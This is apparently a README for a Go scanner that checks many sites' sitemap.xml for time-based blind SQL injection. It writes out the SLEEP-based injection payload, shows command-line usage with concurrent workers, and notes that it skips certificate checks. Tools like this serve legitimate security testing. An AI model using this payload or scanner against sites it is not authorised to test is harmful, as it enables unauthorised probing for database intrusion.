# SQLi sitemap.xml Scanner

This Go tool automates the detection of potential SQL Injection vulnerabilities in sitemap.xml using **time-based blind SQL injection (SLEEP function)**. It works by:

- Sending an **initial request** to measure the normal response time.
- Sending a **crafted SQL payload** to test for execution delays.
- Logging only the vulnerable URLs where execution delay is detected.
- Supporting **concurrent execution** for efficiency.
- Offering a **silent mode** to display only successful cases.

## Features
- **Skips slow URLs**: If the initial request takes more than **3 seconds**, it's skipped.
- **SQL Injection Payload**: `/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#`
- **Silent Mode (`--silent`)**: Only logs URLs where the payload execution time exceeds **8 seconds**.
- **Concurrent Execution (`-w`)**: Uses multiple workers to speed up the scanning process.
- **Bypasses SSL Certificate Verification**: Useful for testing misconfigured HTTPS.

## Installation

### Clone the repository
```sh
git clone https://github.com/yourusername/sqli-xml.git
cd sqli-xml
```

### Install dependencies
go build sqli-xml.go

## Usage
### Basic Usage
```sh
go run sqli-xml.go -l urls.txt -o output.txt
```
or
```
sqli-xml -l urls.txt -o output.txt

### Silent Mode (Only Show Vulnerable URLs)
```sh
go run sqli-xml.go -l urls.txt -o output.txt --silent
```

### Adjust Worker Count (Default: 12)
```sh
go run sqli-xml.go -l urls.txt -o output.txt -w 20
```

## Output Example
### Standard Mode
```
https://example.com/sitemap.xml [1.245 sec] -> https://example.com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)# [9.127 sec]
```

### Silent Mode (`--silent`)
```
https://example.com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
```

## Notes
- urls.txt must contain like : https://example.com , don't add sitemap.xml , it will add it automatically




